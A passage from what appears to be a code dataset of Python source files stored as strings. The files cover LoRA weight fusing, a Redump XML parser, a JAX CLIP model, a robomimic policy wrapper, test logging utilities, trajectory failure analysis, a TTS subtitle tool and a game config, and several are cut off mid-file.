lora_down_key = \".\".join(prefixes[:idx]) + f\".processor.{lora_key}_lora.down\" + f\".{prefixes[-1]}\"\n            lora_up_key = \".\".join(prefixes[:idx]) + f\".processor.{lora_key}_lora.up\" + f\".{prefixes[-1]}\"\n            assert lora_down_key in lora_state_dict and lora_up_key in lora_state_dict\n            print(f'Fusing lora weight for {unet_key}')\n            fused_state_dict[unet_key] = fused_state_dict[unet_key] + torch.bmm(lora_state_dict[lora_up_key][None, ...], lora_state_dict[lora_down_key][None, ...])[0] * args.lora_scale\n            used_lora_key.append(lora_down_key)\n            used_lora_key.append(lora_up_key)\n    assert len(set(used_lora_key) - set(lora_state_dict.keys())) == 0\n    print(f'Fusing done')\n    save_path = os.path.join(args.save_path, SAFETENSORS_WEIGHTS_NAME)\n    print(f'Saving the fused state dict to {save_path}')\n    save_file(fused_state_dict, save_path)\n    config_dst_path = os.path.join(args.save_path, 'config.json')\n    print(f'Copying the unet config to {config_dst_path}')\n    shutil.copy(args.unet_config_path, config_dst_path)\n    print('Done!')\n",
    "import xml.etree.ElementTree as ET\n\nfrom top_games_size.game_size import GameSize\n\n\nclass Game:\n    def __init__(self, name, category, description, roms):\n        self.name = name\n        self.category = category\n        self.description = description\n        self.roms = roms\n\n\nclass Rom:\n    def __init__(self, name, size, crc, md5, sha1):\n        self.name = name\n        self.size = size\n        self.crc = crc\n        self.md5 = md5\n        self.sha1 = sha1\n\n\ndef parse_redump_xml(xml_string):\n    root = ET.fromstring(xml_string)\n\n    game_sizes = []\n\n    for game_element in root.findall(\"game\"):\n        name = game_element.attrib[\"name\"]\n        category = game_element.find(\"category\").text\n        description = game_element.find(\"description\").text\n\n        roms = []\n        for rom_element in game_element.findall(\"rom\"):\n            rom = Rom(\n                rom_element.attrib[\"name\"],\n                int(rom_element.attrib[\"size\"]),\n                rom_element.attrib.get(\"crc\", \"\"),\n                rom_element.attrib.get(\"md5\", \"\"),\n                rom_element.attrib.get(\"sha1\", \"\"),\n            )\n            roms.append(rom)\n\n        game = Game(name, category, description, roms)\n\n        ## Filter out junk\n        if category == \"Games\":\n            biggest_rom = None\n            for rom in game.roms:\n                if not biggest_rom or rom.size > biggest_rom.size:\n                    biggest_rom = rom\n\n            game_sizes.append(GameSize(name, biggest_rom.size))\n\n    return game_sizes\n",
    "import logging\nfrom typing import Any, Callable, Iterable, Optional, Sequence, Tuple, Union\nimport numpy as np\nimport math\nimport einops\n\nimport jax\nfrom jax import lax\nfrom flax import linen as nn\nfrom flax.linen import partitioning as nn_partitioning\nimport jax.numpy as jnp\nimport functools\nfrom flax import struct\n\nfrom jax.sharding import PartitionSpec as PS\nfrom flax.linen.attention import dot_product_attention_weights\nfrom flax.linen import partitioning as nn_partitioning\n\nfrom transformers.configuration_utils import PretrainedConfig\nfrom ml_collections import ConfigDict\nfrom ml_collections.config_dict import config_dict\nfrom mlxu import function_args_to_config, load_pickle, open_file\n\nimport tempfile\nfrom tqdm import tqdm\nimport requests\nimport os\nimport random\n\nfrom module.jax_utils import (\n        with_sharding_constraint, get_gradient_checkpoint_policy, get_jax_mesh\n)\nfrom module.bpt import blockwise_ffn, blockwise_attn\n\n# from .config import PARAMTER_DTYPE\n\nArray = jnp.ndarray\nDType = jnp.dtype\nPRNGKey = jnp.ndarray\nShape = Iterable[int]\n\nInitializer = Callable[[PRNGKey, Shape, DType], Array]\n\ndefault_kernel_init = nn.initializers.glorot_uniform()\n\nremat = nn_partitioning.remat\n\n\nVIT_STANDARD_CONFIGS = {\n    'ViT-L/14-336': {\n        'image_patch_size': 14,\n        'image_pos_patch_size': 14,\n        'image_emb_dim': 1024,\n        'image_num_heads': 16,\n        'image_num_layers': 23,\n        'image_head_dim': 64,\n        'image_mlp_dim': 4096,\n        'image_mlp_activations': ('gelu',),\n        'image_dropout_rate': 0.0,\n        'image_num_pos': 577,\n        'image_default_input_size': (336, 336),\n        'image_pooling_h': 2,\n        'image_pooling_w': 2,\n        'image_num_patch': (24, 24),\n        'image_norm_eps': 1e-5,\n        'image_num_key_value_heads': 16\n    },\n    'debug': {\n        'image_patch_size': 14,\n        'image_pos_patch_size': 14,\n        'image_emb_dim': 1024,\n        'image_num_heads': 16,\n        'image_num_layers': 2,\n        'image_head_dim': 64,\n        'image_mlp_dim': 4096,\n        'image_mlp_activations': ('gelu',),\n        'image_dropout_rate': 0.0,\n        'image_num_pos': 577,\n        'image_default_input_size': (336, 336),\n        'image_pooling_h': 2,\n        'image_pooling_w': 2,\n        'image_num_patch': (24, 24),\n        'image_norm_eps': 1e-5,\n        'image_num_key_value_heads': 16\n    }\n}\n\n\nclass CLIPConfig(PretrainedConfig):\n    model_type = \"OpenAI_CLIP\"\n    \n    def __init__(\n        self,\n        image_patch_size = 14,\n        image_pos_patch_size = 14,\n        image_emb_dim = 1024,\n        image_num_heads = 16,\n        image_num_key_value_heads = 16,\n        image_num_layers = 24,\n        image_head_dim = 64,\n        image_mlp_dim = 4096,\n        image_mlp_activations = ('gelu',),\n        image_dropout_rate = 0.0,\n        image_default_input_size = (336, 336),\n        image_num_pos = 577,\n        image_dtype = 'bfloat16',\n        image_norm_eps = 1e-5,\n        attn_pdrop=0.0,\n        resid_pdrop=0.0,\n        scan_mlp=False,\n        scan_attention=False,\n        scan_query_chunk_size=1024,\n        scan_key_chunk_size=1024,\n        scan_mlp_chunk_size=1024,\n        initializer_range=0.2,\n        remat_block='',\n        **kwargs,\n    ):\n        self.image_patch_size = image_patch_size\n        self.image_pos_patch_size = image_pos_patch_size\n        self.image_emb_dim = image_emb_dim\n        self.image_num_heads = image_num_heads\n        self.image_num_layers = image_num_layers\n        self.image_head_dim = image_head_dim\n        self.image_mlp_dim = image_mlp_dim\n        self.image_mlp_activations = image_mlp_activations\n        self.image_dropout_rate = image_dropout_rate\n        self.image_default_input_size = image_default_input_size\n        self.image_num_pos = image_num_pos\n        self.image_dtype = image_dtype\n        self.image_norm_eps = image_norm_eps\n        self.attn_pdrop = attn_pdrop\n        self.scan_mlp = scan_mlp\n        self.scan_query_chunk_size = scan_query_chunk_size\n        self.scan_key_chunk_size = scan_key_chunk_size\n        self.scan_mlp_chunk_size = scan_mlp_chunk_size\n        self.remat_block = remat_block\n        self.image_num_key_value_heads = image_num_key_value_heads\n        self.initializer_range = initializer_range\n        self.resid_pdrop = resid_pdrop\n        self.scan_attention = scan_attention\n        \n        super().__init__(\n            **kwargs,\n        )\n        \n    @classmethod\n    def get_default_config(cls, updates=None):\n        config = function_args_to_config(cls.__init__)\n        if updates is not None:\n            config.update(ConfigDict(updates).copy_and_resolve_references())\n        return config\n\ndef QuickGELU(x): return x * nn.sigmoid(1.702 * x)\n    \nclass MLP(nn.Module):\n    config: CLIPConfig\n    dtype: DType = jnp.float32\n    param_dtype: DType = jnp.float32\n    \n    @nn.compact\n    def __call__(self, x, deterministic=True):\n        cfg = self.config\n        x = nn.Dense(\n            cfg.imag",
    "from typing import Dict\nimport torch\nfrom diffusion_policy.model.common.normalizer import LinearNormalizer\nfrom diffusion_policy.policy.base_image_policy import BaseImagePolicy\nfrom diffusion_policy.common.pytorch_util import dict_apply\n\nfrom robomimic.algo import algo_factory\nfrom robomimic.algo.algo import PolicyAlgo\nimport robomimic.utils.obs_utils as ObsUtils\nfrom diffusion_policy.common.robomimic_config_util import get_robomimic_config\n\nclass RobomimicImagePolicy(BaseImagePolicy):\n    def __init__(self, \n            shape_meta: dict,\n            algo_name='bc_rnn',\n            obs_type='image',\n            task_name='square',\n            dataset_type='ph',\n            crop_shape=(76,76)\n        ):\n        super().__init__()\n\n        # parse shape_meta\n        action_shape = shape_meta['action']['shape']\n        assert len(action_shape) == 1\n        action_dim = action_shape[0]\n        obs_shape_meta = shape_meta['obs']\n        obs_config = {\n            'low_dim': [],\n            'rgb': [],\n            'depth': [],\n            'scan': []\n        }\n        obs_key_shapes = dict()\n        for key, attr in obs_shape_meta.items():\n            shape = attr['shape']\n            obs_key_shapes[key] = list(shape)\n\n            type = attr.get('type', 'low_dim')\n            if type == 'rgb':\n                obs_config['rgb'].append(key)\n            elif type == 'low_dim':\n                obs_config['low_dim'].append(key)\n            else:\n                raise RuntimeError(f\"Unsupported obs type: {type}\")\n\n        # get raw robomimic config\n        config = get_robomimic_config(\n            algo_name=algo_name,\n            hdf5_type=obs_type,\n            task_name=task_name,\n            dataset_type=dataset_type)\n\n        \n        with config.unlocked():\n            # set config with shape_meta\n            config.observation.modalities.obs = obs_config\n\n            if crop_shape is None:\n                for key, modality in config.observation.encoder.items():\n                    if modality.obs_randomizer_class == 'CropRandomizer':\n                        modality['obs_randomizer_class'] = None\n            else:\n                # set random crop parameter\n                ch, cw = crop_shape\n                for key, modality in config.observation.encoder.items():\n                    if modality.obs_randomizer_class == 'CropRandomizer':\n                        modality.obs_randomizer_kwargs.crop_height = ch\n                        modality.obs_randomizer_kwargs.crop_width = cw\n\n        # init global state\n        ObsUtils.initialize_obs_utils_with_config(config)\n\n        # load model\n        model: PolicyAlgo = algo_factory(\n                algo_name=config.algo_name,\n                config=config,\n                obs_key_shapes=obs_key_shapes,\n                ac_dim=action_dim,\n                device='cpu',\n            )\n\n        self.model = model\n        self.nets = model.nets\n        self.normalizer = LinearNormalizer()\n        self.config = config\n\n    def to(self,*args,**kwargs):\n        device, dtype, non_blocking, convert_to_format = torch._C._nn._parse_to(*args, **kwargs)\n        if device is not None:\n            self.model.device = device\n        super().to(*args,**kwargs)\n    \n    # =========== inference =============\n    def predict_action(self, obs_dict: Dict[str, torch.Tensor]) -> Dict[str, torch.Tensor]:\n        nobs_dict = self.normalizer(obs_dict)\n        robomimic_obs_dict = dict_apply(nobs_dict, lambda x: x[:,0,...])\n        naction = self.model.get_action(robomimic_obs_dict)\n        action = self.normalizer['action'].unnormalize(naction)\n        # (B, Da)\n        result = {\n            'action': action[:,None,:] # (B, 1, Da)\n        }\n        return result\n\n    def reset(self):\n        self.model.reset()\n\n    # =========== training ==============\n    def set_normalizer(self, normalizer: LinearNormalizer):\n        self.normalizer.load_state_dict(normalizer.state_dict())\n\n    def train_on_batch(self, batch, epoch, validate=False):\n        nobs = self.normalizer.normalize(batch['obs'])\n        nactions = self.normalizer['action'].normalize(batch['action'])\n        robomimic_batch = {\n            'obs': nobs,\n            'actions': nactions\n        }\n        input_batch = self.model.process_batch_for_training(\n            robomimic_batch)\n        info = self.model.train_on_batch(\n            batch=input_batch, epoch=epoch, validate=validate)\n        # keys: losses, predictions\n        return info\n    \n    def on_epoch_end(self, epoch):\n        self.model.on_epoch_end(epoch)\n\n    def get_optimizer(self):\n        return self.model.optimizers['policy']\n\n\ndef test():\n    import os\n    from omegaconf import OmegaConf\n    cfg_path = os.path.expanduser('~/dev/diffusion_policy/diffusion_policy/config/task/lift_image.yaml')\n    cfg = OmegaConf.load(cfg_path)\n    shape_meta = cfg.shape_meta\n\n    policy = RobomimicImagePolicy(shape_meta=shape_meta)\n\n",
    "import functools\nimport logging\nimport traceback\nimport types\nimport unittest\nfrom unittest import TestCase\nfrom unittest._log import _CapturingHandler, _AssertLogsContext\n\nimport _testcapi\n\nfrom ibind import var\nfrom ibind.support.py_utils import make_clean_stack\n\n\ndef raise_from_context(cm, level='WARNING'):\n    for record in cm.records:\n        if record.levelno >= getattr(logging, level):\n            raise RuntimeError(record.message)\n\n\ndef verify_log(test_case:TestCase, cm, expected_messages, comparison:callable= lambda x, y: x == y):\n    messages = [record.msg for record in cm.records]\n    missing_expected = expected_messages.copy()\n    for i, expected_msg in enumerate(expected_messages):\n        for msg in messages:\n            if comparison(expected_msg, msg):\n                missing_expected.remove(expected_msg)\n                break\n\n    if missing_expected:\n        test_case.fail(\"Expected log(s) not found:\\n\\t{}\".format('\\n\\t'.join(missing_expected)))\n\n\ndef verify_log_simple(test_self, cm, expected_messages):\n    for i, msg in enumerate(expected_messages):\n        test_self.assertEqual(msg, cm.records[i].msg)\n\ndef exact_log(test_case, cm, expected_messages):\n    test_case.assertEqual(expected_messages, [record.msg for record in cm.records])\n\n\nclass SafeAssertLogs(_AssertLogsContext):\n    \"\"\"\n    The self.assertLogs context manager, that sets log level on the handler instead of logger.\n\n    Original docstring:\n    A context manager used to implement TestCase.assertLogs().\n    \"\"\"\n    def __init__(self, *args, logger_level:str=None, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.logger_level = logger_level\n\n    def __enter__(self, include_original_handlers:bool=False):\n        if isinstance(self.logger_name, logging.Logger):\n            logger = self.logger = self.logger_name\n        else:\n            logger = self.logger = logging.getLogger(self.logger_name)\n        formatter = logging.Formatter(self.LOGGING_FORMAT)\n        handler = _CapturingHandler()\n        handler.setFormatter(formatter)\n        self.watcher = handler.watcher\n        self.old_handlers = logger.handlers[:]\n        self.old_level = logger.level\n        self.old_propagate = logger.propagate\n        logger.handlers = [handler]\n        handler.setLevel(self.level)  # this is different, was logger.setLevel\n        logger.propagate = False\n        if self.logger_level is not None:\n            logger.setLevel(getattr(logging, self.logger_level))\n\n        if include_original_handlers:\n            logger.handlers += self.old_handlers\n            logger.propagate = True\n        return handler.watcher\n\ndef get_logger_children(main_logger) -> list[logging.Logger]:\n    \"\"\"\n    Gets child loggers. Added as a support compat for Python version 3.11 and below.\n    Source: https://github.com/python/cpython/blob/3.12/Lib/logging/__init__.py#L1831\n    \"\"\"\n\n    def _hierlevel(logger):\n        if logger is logger.manager.root:\n            return 0\n        return 1 + logger.name.count('.')\n\n    d = main_logger.manager.loggerDict\n    # exclude PlaceHolders - the last check is to ensure that lower-level\n    # descendants aren't returned - if there are placeholders, a logger's\n    # parent field might point to a grandparent or ancestor thereof.\n    return [item for item in d.values()\n            if isinstance(item, logging.Logger) and item.parent is main_logger and\n            _hierlevel(item) == 1 + _hierlevel(item.parent)]\n\n\nclass RaiseLogsContext:\n    \"\"\"\n    Raises any messages above the level raised by a logger.\n\n    When used in conjunction with self.assertLogs, make sure this context manager is defined after self.assertLogs.\n    \"\"\"\n    def __init__(self,\n                 test_case:TestCase,\n                 logger_name=None,\n                 level='ERROR',\n                 expected_errors:[str]=None,\n                 comparison: callable = lambda x, y: x == y,\n                 ):\n        self._test_case = test_case\n        self._logger_name = logger_name\n        self._level = level\n        self._level_no = getattr(logging, level)\n        if expected_errors is None:\n            expected_errors = []\n        self._expected_errors = expected_errors\n        self._comparison = comparison\n\n    def monkey_patch_log(self, original_method):\n        def new_method(msg, *args, **kwargs):\n            stack = make_clean_stack()\n            if 'extra' not in kwargs:\n                kwargs['extra'] = {}\n            kwargs['extra']['manual_trace'] = stack\n            return original_method(msg, *args, **kwargs)\n\n        return new_method\n\n    def monkey_patch_loggers(self, loggers):\n        for logger in loggers:\n            if self._level_no <= logging.ERROR:\n                logger.__old_error_method__ = logger.error\n                logger.error = self.monkey_patch_log(logger.error)\n            if self._level_no <= logging.WARNING:\n                logger.__old_warning_method__ = logger.warning\n                logger.warning = self.monkey_pa",
    "\"\"\"\nThis file parses trajectories and characterizes the failures in the trajectory according to four buckets:\narithmetic, exploration (jumping logical steps), formatting and other.\n\"\"\"\n\nimport argparse\nimport copy\nimport re\nfrom tqdm import tqdm\nimport json\nimport matplotlib.pyplot as plt\nfrom countdown_utils import *\nimport numpy as np\nimport math\n\ndef plot_metric_against_len(lengths, metric, metric_name):\n    plt.scatter(lengths, metric, color='blue')\n    plt.title(f\"{metric_name} against Length of Trajectory\")\n    plt.xlabel(\"Length of Trajectory\")\n    plt.ylabel(f\"{metric_name}\")\n\ndef std_to_95_ci(std, n):\n    \"\"\"\n    Translates standard deviation to a 95% confidence interval.\n\n    Args:\n        std (float): Standard deviation of the sample.\n        n (int): Sample size.\n\n    Returns:\n        float: margin of error\n    \"\"\"\n    # Calculate the standard error\n    se = std / math.sqrt(n)\n    \n    # Calculate the margin of error for a 95% confidence interval\n    margin_of_error = 1.96 * se\n    \n    return margin_of_error\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Characterize the failures in the trajectories')\n    parser.add_argument('--data_file', type=str, help='The file containing the trajectories', default='')\n    args = parser.parse_args()\n    data_file = args.data_file\n    with open(data_file, \"r\") as json_file:\n        data = json.load(json_file)\n    if type(data) == list:\n        old_data = copy.deepcopy(data)\n        data = {\"trajectories\": [d[\"search_path\"] for d in old_data]}\n    search_trees = []\n    correctness = []\n    goal_reached = []\n    ratings = []\n    num_total_nodes = []\n    num_nodes_in_correct_path = []\n    errors = []\n    num_arithmetic_errors = []\n    num_formatting_errors = []\n    num_other_errors = []\n    num_exploration_errors = []\n    num_errors = []\n\n    total_num = len(data[\"trajectories\"])\n    num_correct = 0\n    ave_rating = 0\n    num_goal_reached = 0\n    ave_num_total_nodes_all = 0\n\n    ave_num_total_nodes_correct = 0\n    ave_num_nodes_in_correct_path = 0\n\n    lengths_of_inputs = []\n    lengths_of_correct_inputs = []\n\n    for trajectory in tqdm(data[\"trajectories\"], total=len(data[\"trajectories\"])):\n        lengths_of_inputs.append(len(trajectory))\n        tree = SearchTree()\n        result = tree.parse_search_trajectory(trajectory)\n        search_trees.append(tree)\n        correctness.append(tree.correctness)\n        goal_reached.append(tree.goal_reached)\n        ratings.append(tree.rating)\n        num_total_nodes.append(tree.num_total_nodes)\n        num_nodes_in_correct_path.append(tree.num_nodes_in_correct_path)\n        errors.append(tree.errors)\n\n        num_arithmetic_errors.append(len(tree.errors[\"arithmetic\"]))\n        num_formatting_errors.append(len(tree.errors[\"formatting\"]))\n        num_other_errors.append(len(tree.errors[\"other\"]))\n        num_exploration_errors.append(len(tree.errors[\"exploration\"]))\n        num_errors.append(len(tree.errors[\"arithmetic\"]) + len(tree.errors[\"formatting\"]) + len(tree.errors[\"other\"]) +\n                          len(tree.errors[\"exploration\"]))\n        if tree.goal_reached == 1:\n            num_goal_reached += 1\n        ave_num_total_nodes_all += tree.num_total_nodes\n        if tree.correctness == 1:\n            num_correct += 1\n            ave_num_nodes_in_correct_path += tree.num_nodes_in_correct_path\n            ave_num_total_nodes_correct += tree.num_total_nodes\n            lengths_of_correct_inputs.append(tree.num_total_nodes)\n\n    ave_num_arithmetic_errors = sum(num_arithmetic_errors) / total_num\n    ave_num_formatting_errors = sum(num_formatting_errors) / total_num\n    ave_num_other_errors = sum(num_other_errors) / total_num\n    ave_num_exploration_errors = sum(num_exploration_errors) / total_num\n    ave_num_total_errors = sum(num_errors) / total_num\n\n    std_arithmetic_errors = np.std(np.array(num_arithmetic_errors))\n    ci_arithmetic_errors = std_to_95_ci(std_arithmetic_errors, total_num)\n    std_formatting_errors = np.std(np.array(num_formatting_errors))\n    ci_formatting_errors = std_to_95_ci(std_formatting_errors, total_num)\n    std_other_errors = np.std(np.array(num_other_errors))\n    ci_other_errors = std_to_95_ci(std_other_errors, total_num)\n    std_exploration_errors = np.std(np.array(num_exploration_errors))\n    ci_exploration_errors = std_to_95_ci(std_exploration_errors, total_num)\n\n    ave_rating = sum(ratings) / total_num\n    ave_num_total_nodes_all = sum(num_total_nodes) / total_num\n    std_num_total_nodes = np.std(np.array(num_total_nodes))\n    ci_num_total_nodes = std_to_95_ci(std_num_total_nodes, total_num)\n    if num_correct > 0:\n        ave_num_nodes_in_correct_path = sum(num_nodes_in_correct_path) / num_correct\n        std_num_nodes_in_correct_path = np.std(np.array(num_nodes_in_correct_path))\n        ci_num_nodes_in_correct_path = std_to_95_ci(std_num_nodes_in_correct_path, num_correct)\n        ave_num_total_nodes_correct = sum(num_total_nodes) / num_correct\n        s",
    "#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n# @author:anning\n# @email:anningforchina@gmail.com\n# @time:2024/04/09 14:44\n# @file:voice_caption.py\n# \u5c06\u56fe\u7247\u548c\u6587\u5b57\uff0c\u5b57\u5e55 \u4e00\u6b21\u6027\u5408\u6210\nimport json\nimport os.path\nimport random\nimport re\nfrom datetime import datetime\nimport subprocess\nimport asyncio\n\nimport aiofiles\nimport edge_tts\n\nfrom char2voice import create_voice_srt_new2\nfrom load_config import get_yaml_config, check_file_exists, print_tip\n\nconfig = get_yaml_config()\nlimit = config[\"audio\"][\"limit\"]\nrole = config[\"audio\"][\"role\"]\nrate = config[\"audio\"][\"rate\"]\nvolume = config[\"audio\"][\"volume\"]\nbgm = config[\"audio\"][\"bgm\"]\nmain_db = config[\"audio\"][\"main_db\"]\nbgm_db = config[\"audio\"][\"bgm_db\"]\nonce = config[\"video\"][\"once\"]\nmemory = config[\"book\"][\"memory\"]\n\n\nasync def spilt_str2(s, t, k=limit):\n    \"\"\"\n    :param s: \u5207\u7247\u6587\u672c\n    :param t: \u5207\u5206\u524d\u65f6\u95f4\n    :param k: \u5207\u5206\u6700\u5927\u5b57\u6570\n    :return:  \u65b0\u7684\u5207\u7247\u4fe1\u606f\n\n    @ samples\n        s = \"\u5e76\u4e14\u89c9\u9192\u5929\u8d4b \u5f97\u5230\u529b\u91cf \u5bf9\u6297\u51f6\u517d \u89c9\u9192\u5929\u8d4b \u4fbf\u662f\u4eba\u4eba\u5728\u5341\u516b\u5c81\u65f6\u80fd\u4ee5\u8840\u8109\u6c9f\u901a\u6c9f\u901a \u89c9\u9192\u5929\u8d4b\"\n        t = \"00:00:35,184 --> 00:00:42,384\"\n        k = 15\n    \"\"\"\n\n    async def time2second(ti):\n        \"\"\"\n        :param ti: \u8f93\u5165\u65f6\u95f4\uff0c \u683c\u5f0f\u793a\u4f8b\uff1a00:02:56,512\n        :return: float\n        \"\"\"\n        a, b, _c = ti.split(\":\")\n        c, d = _c.split(\",\")\n\n        a, b, c, d = int(a), int(b), int(c), int(d)\n\n        second = a * 3600 + b * 60 + c + d / 1000\n\n        return second\n\n    async def second2time(si):\n        hours = int(si // 3600)\n        minutes = int((si % 3600) // 60)\n        seconds = int(si % 60)\n        milliseconds = round((si % 1) * 1000)\n\n        v = \"00\"\n        u = \"000\"\n        a = v[: 2 - len(str(hours))] + str(hours)\n        b = v[: 2 - len(str(minutes))] + str(minutes)\n        c = v[: 2 - len(str(seconds))] + str(seconds)\n        d = u[: 3 - len(str(milliseconds))] + str(milliseconds)\n\n        return f\"{a}:{b}:{c},{d}\"\n\n    ss = s.split(\" \")\n    ss_valid = []\n\n    # todo \u5c06\u6240\u6709\u7247\u6bb5\u8bbe\u7f6e\u6210\u4e0d\u8d85\u8fc715\n    for _ss in ss:\n        if len(_ss) > k:\n\n            # \u66b4\u529b\u622a\u65ad\u51e0\u6bb5\n            e = len(_ss) // k + 1\n            n_e = len(_ss) // e + 1\n\n            for _i in range(e):\n                if _i == e - 1:\n                    ss_valid.append(_ss[n_e * _i :])\n                else:\n                    ss_valid.append(_ss[n_e * _i : n_e * (_i + 1)])\n        else:\n            ss_valid.append(_ss)\n\n    # todo \u7247\u6bb5\u5408\u5e76\n    tmp = \"\"\n    new_ss = []\n    for i in range(len(ss_valid)):\n        tmp += ss_valid[i]\n\n        if i < len(ss_valid) - 1:\n            if len(tmp + ss_valid[i + 1]) > k:\n                new_ss.append(tmp)\n                tmp = \"\"\n            else:\n                continue\n        else:\n            new_ss.append(tmp)\n            tmp = \"\"\n\n    # \u5206\u914d\u65f6\u95f4\u6233\n    t1, t2 = t.split(\"-->\")\n    ft1 = await time2second(t1)\n    ft2 = await time2second(t2)\n    ftd = ft2 - ft1\n\n    # \u8f6c\u6362\u6210\u79d2\u6570\n    all_str = \" \".join(new_ss)\n\n    tt_s = 0\n    line_srt = []\n    for z in new_ss:\n        tt_e = len(z) + tt_s\n\n        # \u6587\u7ae0\u6700\u540e\u4e00\u53e5\u5f02\u5e38\u5904\u7406\n        if len(all_str) * ftd == 0:\n            continue\n\n        t_start = tt_s / len(all_str) * ftd\n        t_end = tt_e / len(all_str) * ftd\n        t_start = round(t_start, 3)\n        t_end = round(t_end, 3)\n\n        rec_s = await second2time(ft1 + t_start)\n        rec_e = await second2time(ft1 + t_end)\n\n        cc = (f\"{rec_s} --> {rec_e}\", z)\n        line_srt.append(cc)\n\n        tt_s = tt_e + 1\n\n    return line_srt\n\n\nasync def time_difference(time1, time2):\n    time_format = r\"%H:%M:%S,%f\"\n    time1 = datetime.strptime(time1, time_format)\n    time2 = datetime.strptime(time2, time_format)\n\n    # \u8ba1\u7b97\u65f6\u95f4\u5dee\n    delta = time2 - time1\n    time_diff = str(delta).replace(\".\", \",\")[:11]\n    return time_diff\n\n\nasync def load_srt_new(filename, flag=True):\n    time_format = r\"(\\d{2}:\\d{2}:\\d{2}),\\d{3} --> (\\d{2}:\\d{2}:\\d{2}),\\d{3}\"\n\n    n = 0  # srt \u6587\u4ef6\u603b\u884c\u6570\n    index = 0  # strs \u6587\u5b57\u4e32\u79fb\u52a8\u4e0b\u6807\n    line_tmp = \"\"  # \u6bcf\u4e2a\u65f6\u95f4\u533a\u95f4\u540e\u7684\u5b57\u6570\u7d2f\u8ba1\n    count_tmp = 0  # \u6bcf\u4e2a\u65f6\u95f4\u533a\u95f4\u540e\u7684\u5b57\u6570\u884c\u8ba1\u6570\n    new_srt = []\n\n    async with aiofiles.open(filename, mode=\"r\", encoding=\"utf-8\") as f3:\n        f_lines = await f3.readlines()\n        for line in f_lines:\n            line = line.strip(\"\\n\")\n            n += 1\n\n            # \u5199\u5165\u65b0\u7684\u6570\u636e\n            #   1)\u5f53\u51fa\u73b0\u5728\u6587\u672c\u672b\u5199\u5165\u4e00\u6b21\n            if n == len(f_lines):\n                new_srt_line = await spilt_str2(line_tmp, t_line_cur)\n                new_srt.append(new_srt_line)\n\n            #   2\uff09\u5f53\u65b0\u7684\u4e00\u884c\u662f\u6570\u5b57\u65f6\uff0csrt\u8bed\u53e5\u6bb5\u5199\u5165\n            # case1: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u4e0d\u662f\u6570\u5b57\n            if line.isdigit():\n                if flag:\n                    print(line)\n                if n > 1:\n                    new_srt_line = await spilt_str2(line_tmp, t_line_cur)\n                    new_srt.append(new_srt_line)\n                continue\n\n            # case2: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u4e0d\u662f\u65f6\u95f4\u6bb5\n            if re.match(time_format, line):\n                t_line_cur = line\n                # reset line_tmp\n                line_tmp = \"\"\n                count_tmp = 0\n                continue\n\n            # case3: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u7a7a\u683c\u65f6\n            if len(line) == 0:\n                continue\n\n            # case4: \u65b0\u7684\u4e00\u884c\u4e0d\u5c5e\u4e8e\u4e0a\u9762\u5176\u4e2d\u4e4b\u4e00\n            line_std = line.replace(\" \", \"\")",
    "\"\"\"\nAuthor: Night-stars-1 nujj1042633805@gmail.com\nDate: 2024-04-11 20:58:19\nLastEditTime: 2024-04-27 21:49:52\nLastEditors: Night-stars-1 nujj1042633805@gmail.com\n\"\"\"\n\nfrom qfluentwidgets import ConfigItem, QConfig\n\n\nclass RunningBusinessConfig(QConfig):\n    \"\"\"Config of application\"\"\"\n\n    totalMaxBook = ConfigItem(\"RunningBusiness\", \"totalMaxBook\", 4, None)\n    profitThreshold = ConfigItem(\"RunningBusiness\", \"profitThreshold\", 100000, None)\n    priceThreshold = ConfigItem(\"RunningBusiness\", \"priceThreshold\", 500, None)\n    maxGoodsNum = ConfigItem(\"RunningBusiness\", \"maxGoodsNum\", 625, None)\n    tiredProfitThreshold = ConfigItem(\"RunningBusiness\", \"tiredProfitThreshold\", 12000, None)\n\n    \u6731\u5229\u5b89 = ConfigItem(\"SkillLevel\", \"\u6731\u5229\u5b89\", 0, None)\n    \u72ee\u9b03 = ConfigItem(\"SkillLevel\", \"\u72ee\u9b03\", 0, None)\n    \u9b47 = ConfigItem(\"SkillLevel\", \"\u9b47\", 0, None)\n    \u585e\u897f\u5c14 = ConfigItem(\"SkillLevel\", \"\u585e\u897f\u5c14\", 0, None)\n    \u96f7\u706b = ConfigItem(\"SkillLevel\", \"\u96f7\u706b\", 0, None)\n    \u9edb\u4e1d\u8389 = ConfigItem(\"SkillLevel\", \"\u9edb\u4e1d\u8389\", 0, None)\n    \u827e\u7565\u7279 = ConfigItem(\"SkillLevel\", \"\u827e\u7565\u7279\", 0, None)\n    \u9759\u6d41 = ConfigItem(\"SkillLevel\", \"\u9759\u6d41\", 0, None)\n    \u591a\u841d\u897f = ConfigItem(\"SkillLevel\", \"\u591a\u841d\u897f\", 0, None)\n    \u5361\u83b2 = ConfigItem(\"SkillLevel\", \"\u5361\u83b2\", 0, None)\n    \u661f\u82b1 = ConfigItem(\"SkillLevel\", \"\u661f\u82b1\", 0, None)\n    \u745e\u79cb = ConfigItem(\"SkillLevel\", \"\u745e\u79cb\", 0, None)\n    \u83f2\u59ae\u5a05 = ConfigItem(\"SkillLevel\", \"\u83f2\u59ae\u5a05\", 0, None)\n    \u74e6\u4f26\u6c40 = ConfigItem(\"SkillLevel\", \"\u74e6\u4f26\u6c40\", 0, None)\n    \u963f\u77e5\u6ce2 = ConfigItem(\"SkillLevel\", \"\u963f\u77e5\u6ce2\", 0, None)\n    \u95fb\u7b19 = ConfigItem(\"SkillLevel\", \"\u95fb\u7b19\", 0, None)\n    \u5c71\u5c9a = ConfigItem(\"SkillLevel\", \"\u5c71\u5c9a\", 0, None)\n    \u53f6\u73cf = ConfigItem(\"SkillLevel\", \"\u53f6\u73cf\", 0, None)\n    \u96bc = ConfigItem(\"SkillLevel\", \"\u96bc\", 0, None)\n    \u5948\u5f25 = ConfigItem(\"SkillLevel\", \"\u5948\u5f25\", 0, None)\n    \u4f0a\u5c14 = ConfigItem(\"SkillLevel\", \"\u4f0a\u5c14\", 0, None)\n    \u7518\u96c5 = ConfigItem(\"SkillLevel\", \"\u7518\u96c5\", 0, None)\n    \u59ae\u853b\u62c9 = ConfigItem(\"SkillLevel\", \"\u59ae\u853b\u62c9\", 0, None)\n    \u5361\u6d1b\u7433 = ConfigItem(\"SkillLevel\", 